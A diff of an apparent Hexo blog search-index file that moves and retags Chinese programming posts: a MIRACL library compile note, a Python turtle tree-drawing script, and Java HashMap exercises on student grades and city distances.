+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc filename.c miracl.a -o filename</span><br><span class="line">./filename.exe</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a href="https://www.cnblogs.com/little-kwy/p/12285955.html">树莓派下编译并使用miracl密码库</a></li>
+<li><a href="https://blog.csdn.net/joker_clown/article/details/83662846">win10+gcc+miracl</a></li>
+</ul>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
       <tags>
-        <tag>Python</tag>
+        <tag>Miracl</tag>
+        <tag>密码学</tag>
       </tags>
   </entry>
   <entry>
@@ -3668,6 +3653,21 @@ SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;
       <tags>
         <tag>C#</tag>
         <tag>.NET</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>利用Python画小树和森林（宽度优先绘制+深度优先绘制)</title>
+    <url>/posts/15900/</url>
+    <content><![CDATA[<p>在中M上看嵩天老师的<a href="http://www.icourse163.org/learn/BIT-268001">《Python语言程序设计》</a>时,视频中给出了宽度优先绘制法的代码,仅提了一下还有另外一种画法(深度优先绘制法).联系到最近学的数据结构，摸索出了另一种画法。</p>
+<span id="more"></span>
+<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Created on Dec 2, 2017</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: QiZhao</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># drawtree.py</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> Turtle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree</span>(<span class="params">plist, l, a, f</span>):</span><br><span class="line">    <span class="comment">#宽度优先绘制法</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; plist is list of pens</span></span><br><span class="line"><span class="string">    l is length of branch</span></span><br><span class="line"><span class="string">    a is half of the angle between 2 branches</span></span><br><span class="line"><span class="string">    f is factor by which branch is shortened</span></span><br><span class="line"><span class="string">    from level to level.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> l &gt; <span class="number">5</span>:</span><br><span class="line">        lst = []</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> plist:</span><br><span class="line">            p.forward(l)<span class="comment">#Move the turtle forward by the specified distance, in the direction the turtle is headed.</span></span><br><span class="line">            q = p.clone()<span class="comment">#Create and return a clone of the turtle with same position, heading and turtle properties.</span></span><br><span class="line">            p.left(a) <span class="comment">#Turn turtle left by angle units</span></span><br><span class="line">            q.right(a)<span class="comment"># turn turtle right by angle units, nits are by default degrees, but can be set via the degrees() and radians() functions.</span></span><br><span class="line">            lst.append(p)</span><br><span class="line">            lst.append(q)</span><br><span class="line">        tree(lst, l*f, a, f)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree2</span>(<span class="params">p,l,a,f</span>):</span><br><span class="line">    <span class="comment">#深度优先绘制法</span></span><br><span class="line">    <span class="keyword">if</span> l&gt;<span class="number">5</span>:</span><br><span class="line">        p.forward(l)</span><br><span class="line">        q=p.clone()</span><br><span class="line">        p.left(a)</span><br><span class="line">        q.right(a)</span><br><span class="line">        tree2(p, l*f, a, f)</span><br><span class="line">        tree2(q, l*f, a, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maketree</span>(<span class="params">x,y</span>):     </span><br><span class="line">    p = Turtle()</span><br><span class="line">    p.color(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">    p.pensize(<span class="number">5</span>)</span><br><span class="line">    p.setundobuffer(<span class="literal">None</span>)</span><br><span class="line">    p.hideturtle() </span><br><span class="line">    <span class="comment">#Make the turtle invisible. It’s a good idea to do this while you’re in the middle of doing some complex drawing,</span></span><br><span class="line">    <span class="comment">#because hiding the turtle speeds up the drawing observably.</span></span><br><span class="line">    <span class="comment">#p.speed(9)</span></span><br><span class="line">    p.getscreen().tracer(<span class="number">1</span>,<span class="number">0</span>)<span class="comment">#Return the TurtleScreen object the turtle is drawing on.</span></span><br><span class="line">    <span class="comment">#TurtleScreen methods can then be called for that object.</span></span><br><span class="line">    p.left(<span class="number">90</span>)<span class="comment"># Turn turtle left by angle units. direction</span></span><br><span class="line"> </span><br><span class="line">    p.penup() <span class="comment">#Pull the pen up – no drawing when moving.</span></span><br><span class="line">    p.goto(x,y)<span class="comment">#Move turtle to an absolute position. If the pen is down, draw line. Do not change the turtle’s orientation.</span></span><br><span class="line">    p.pendown()<span class="comment"># Pull the pen down – drawing when moving. </span></span><br><span class="line">    <span class="comment">#这三条语句是一个组合相当于先把笔收起来再移动到指定位置，再把笔放下开始画.否则turtle一移动就会自动的把线画出来</span></span><br><span class="line"> </span><br><span class="line">    tree([p], <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>)</span><br><span class="line">    </span><br><span class="line">    p.penup() </span><br><span class="line">    p.setheading(<span class="number">90</span>)<span class="comment">#Set the orientation of the turtle to to_angle.</span></span><br><span class="line">    p.goto(x,y)</span><br><span class="line">    p.down()</span><br><span class="line">    p.color(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    tree2(p, <span class="number">100</span>, <span class="number">65</span>, <span class="number">0.6375</span>) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    maketree(-<span class="number">200</span>, -<span class="number">200</span>)</span><br><span class="line">    maketree(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    maketree(<span class="number">200</span>,-<span class="number">200</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="/images/20171202204712994.jpg"></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -4018,6 +4018,26 @@ import java.util.Scanner;
       </tags>
   </entry>
   <entry>
+    <title>第三周讨论区_学生成绩的数据结构</title>
+    <url>/posts/13223/</url>
+    <content><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>如果要写程序表达一个班级的很多个学生的很多门课的成绩，应该如何表达这些数据？</p>
+<p>如果我们希望通过学生的姓名，可以找到他的所有的成绩，而每一门课的成绩，是由课程名称和分数构成的。</p>
+<p>而如果我们还希望这个程序能找出某一门课的全部学生的成绩应该怎样做呢？</p>
+<p>注意，并非所有的学生都参加了所有的课程。</p>
+<span id="more"></span>
+<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student_Grade</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Double&gt;&gt; studentInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Double&gt;&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名添加成绩</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name, String course, <span class="type">double</span> grade)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.containsKey(name))</span><br><span class="line">		&#123;</span><br><span class="line">			studentInfo.get(name).put(course, grade);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">			temp.put(course, grade);</span><br><span class="line">			studentInfo.put(name, temp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (k == name)</span><br><span class="line">			&#123;</span><br><span class="line">				temp = studentInfo.get(name);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> name+<span class="string">&quot; &quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">			&#123;</span><br><span class="line">				temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> subject+<span class="string">&quot;:&quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 重载toString()方法</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		String temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span>(String k:studentInfo.keySet())</span><br><span class="line">			temp+=(k+<span class="string">&quot;:&quot;</span>+studentInfo.get(k).toString()+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Student_Grade</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student_Grade</span>();</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;Java&quot;</span>, <span class="number">60.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">70.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;李四&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">80.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;王五&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">90.2</span>);</span><br><span class="line">		System.out.println(student.getScore_name(<span class="string">&quot;张三&quot;</span>));</span><br><span class="line">		System.out.println(student.getScore_subject(<span class="string">&quot;C++&quot;</span>));</span><br><span class="line">		System.out.println(student);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h2><p><img data-src="/images/20170821012136233.jpg"></p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>起初，两个查询的方法如下所示，返回值是一个Hasmap&lt;String,Doubole&gt;。</p>
+<p>后来在为Student_Grade写<code>toString（）</code>方法以便输出所有学生的所有成绩时，想到可以在两个查询的方法中临时建立一个String，调用<code>toString()</code>方法，赋值给它，并对该字符串进行处理，返回一个字符串。使得输出有”姓名“和”课程名“，信息更完整。（强迫症）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (k == name)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = studentInfo.get(name);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">		&#123;</span><br><span class="line">			temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>面向对象程序设计_Java语言_翁恺</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第三周编程题_查找里程</title>
     <url>/posts/25475/</url>
     <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>下图为国内主要城市之间的公路里程：</p>
@@ -4041,26 +4061,6 @@ Hagzou Jigxng
 <h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Third_Week</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;String&gt; city = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Integer&gt;&gt; distince = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Integer&gt;&gt;();</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 输入城市名及距离</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">input</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		String temp;</span><br><span class="line">		<span class="comment">// 读入城市名</span></span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = in.next();</span><br><span class="line">			<span class="keyword">if</span> (temp.equals(<span class="string">&quot;###&quot;</span>) == <span class="literal">true</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			city.add(temp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 读入距离</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; city.size(); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Integer&gt; temp_hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Integer&gt;();</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; city.size(); j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> in.nextInt();</span><br><span class="line">				temp_hashmap.put(city.get(j), dis);</span><br><span class="line">			&#125;</span><br><span class="line">			distince.put(city.get(i), temp_hashmap);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		in.close();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 查找两个城市间的距离</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(String start, String end)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		dis = distince.get(start).get(end);</span><br><span class="line">		<span class="keyword">return</span> dis;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Third_Week</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Third_Week</span>();</span><br><span class="line"><span class="comment">//		Scanner in = new Scanner(System.in);</span></span><br><span class="line">		dis.input();</span><br><span class="line">		<span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span> in.next();</span><br><span class="line">		<span class="type">String</span> <span class="variable">end</span> <span class="operator">=</span> in.next();</span><br><span class="line">		System.out.println(dis.search(start, end));</span><br><span class="line">		in.close();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>题目中给的样例有问题，有的地方多了几个空格，导致在本机测样例的时候，一直无输出，调试了半天。<br>手打了样例之后，发现要查询的两个城市的名字无法读入，怀疑是scanner关闭了两次的问题，注释掉input()方法中的<code>in.close()</code>，果然。。。<br>但是又有个warning，提示<code>input()</code>方法中的in没有关闭。强迫症，把scanner写成全局的，完美解决。<br>开始没读清题意，以为要查询多组城市间的距离，查了下Java中读到末尾的方法，学会了<code>hasnext()</code>等方法。<br>链接：<a href="http://blog.csdn.net/kejizuiqianfang/article/details/55253698">java中关于判断文本文件读到文件尾</a><br>链接：<a href="http://blog.csdn.net/wn1017888485/article/details/46039361">java使用两个scanner，关闭输入流</a></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>面向对象程序设计_Java语言_翁恺</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第三周讨论区_学生成绩的数据结构</title>
-    <url>/posts/13223/</url>
-    <content><![CDATA[<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>如果要写程序表达一个班级的很多个学生的很多门课的成绩，应该如何表达这些数据？</p>
-<p>如果我们希望通过学生的姓名，可以找到他的所有的成绩，而每一门课的成绩，是由课程名称和分数构成的。</p>
-<p>而如果我们还希望这个程序能找出某一门课的全部学生的成绩应该怎样做呢？</p>
-<p>注意，并非所有的学生都参加了所有的课程。</p>
-<span id="more"></span>
-<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student_Grade</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> HashMap&lt;String, HashMap&lt;String, Double&gt;&gt; studentInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, HashMap&lt;String, Double&gt;&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名添加成绩</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name, String course, <span class="type">double</span> grade)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.containsKey(name))</span><br><span class="line">		&#123;</span><br><span class="line">			studentInfo.get(name).put(course, grade);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">			temp.put(course, grade);</span><br><span class="line">			studentInfo.put(name, temp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (k == name)</span><br><span class="line">			&#123;</span><br><span class="line">				temp = studentInfo.get(name);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> name+<span class="string">&quot; &quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">	&#123;</span><br><span class="line">		HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">		<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">			&#123;</span><br><span class="line">				temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> subject+<span class="string">&quot;:&quot;</span>+temp.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 重载toString()方法</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		String temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="keyword">for</span>(String k:studentInfo.keySet())</span><br><span class="line">			temp+=(k+<span class="string">&quot;:&quot;</span>+studentInfo.get(k).toString()+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="type">Student_Grade</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student_Grade</span>();</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;Java&quot;</span>, <span class="number">60.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">70.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;李四&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">80.0</span>);</span><br><span class="line">		student.add(<span class="string">&quot;王五&quot;</span>, <span class="string">&quot;C++&quot;</span>, <span class="number">90.2</span>);</span><br><span class="line">		System.out.println(student.getScore_name(<span class="string">&quot;张三&quot;</span>));</span><br><span class="line">		System.out.println(student.getScore_subject(<span class="string">&quot;C++&quot;</span>));</span><br><span class="line">		System.out.println(student);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h2><p><img data-src="/images/20170821012136233.jpg"></p>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>起初，两个查询的方法如下所示，返回值是一个Hasmap&lt;String,Doubole&gt;。</p>
-<p>后来在为Student_Grade写<code>toString（）</code>方法以便输出所有学生的所有成绩时，想到可以在两个查询的方法中临时建立一个String，调用<code>toString()</code>方法，赋值给它，并对该字符串进行处理，返回一个字符串。使得输出有”姓名“和”课程名“，信息更完整。（强迫症）</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过姓名找到这名学生的所有成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_name</span><span class="params">(String name)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (k == name)</span><br><span class="line">		&#123;</span><br><span class="line">			temp = studentInfo.get(name);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过课程名找到这一门课的全部学生的成绩</span></span><br><span class="line"><span class="keyword">public</span> HashMap&lt;String, Double&gt; <span class="title function_">getScore_subject</span><span class="params">(String subject)</span></span><br><span class="line">&#123;</span><br><span class="line">	HashMap&lt;String, Double&gt; temp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Double&gt;();</span><br><span class="line">	<span class="keyword">for</span> (String k : studentInfo.keySet())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (studentInfo.get(k).containsKey(subject))</span><br><span class="line">		&#123;</span><br><span class="line">			temp.put(k, studentInfo.get(k).get(subject));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>面向对象程序设计_Java语言_翁恺</category>
       </categories>
@@ -4339,13 +4339,13 @@ C 2
 </li>
 <li><a href="#remove-unused-user-field">Remove unused User field</a></li>
 <li><a href="#exception-handle">Exception Handle</a><ul>
-<li><a href="#exception-handle-backend">BackEnd</a><ul>
+<li><a href="#backend">BackEnd</a><ul>
 <li><a href="#drf%E4%B8%AD%E9%94%99%E8%AF%AF%E5%93%8D%E5%BA%94%E7%9A%84%E7%BB%93%E6%9E%84">DRF中错误响应的结构</a></li>
 <li><a href="#validationerror%E7%9A%84%E4%BD%BF%E7%94%A8">ValidationError的使用</a></li>
 <li><a href="#custom-exception-handling">Custom exception handling</a></li>
 </ul>
 </li>
-<li><a href="#exception-handle-frontend">FrontEnd</a></li>
+<li><a href="#frontend">FrontEnd</a></li>
 </ul>
 </li>
 </ul>
@@ -4506,7 +4506,7 @@ C 2
 <details>
 <summary>lib/rest_framewor/pagination.py</summary>
 
